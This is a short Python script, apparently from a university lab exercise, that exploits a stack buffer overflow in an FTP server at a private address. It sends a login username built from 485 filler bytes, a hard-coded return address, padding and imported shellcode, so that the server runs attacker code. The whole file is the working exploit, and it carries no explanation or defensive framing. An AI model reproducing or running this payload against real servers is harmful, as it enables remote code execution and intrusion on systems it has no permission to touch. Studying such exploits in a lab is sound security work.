# 机 构：中国科学院大学
# 程序员：李浩东
# 时 间：2023/4/17 14:28

from shellcode import Shellcode
from ftplib import FTP

ftp = FTP('192.168.47.128')
host_name = 'A' * 485 + '\x7b\x46\x86\x7c' + 'A' * 4 + Shellcode.code
ftp.login(host_name, '666888')
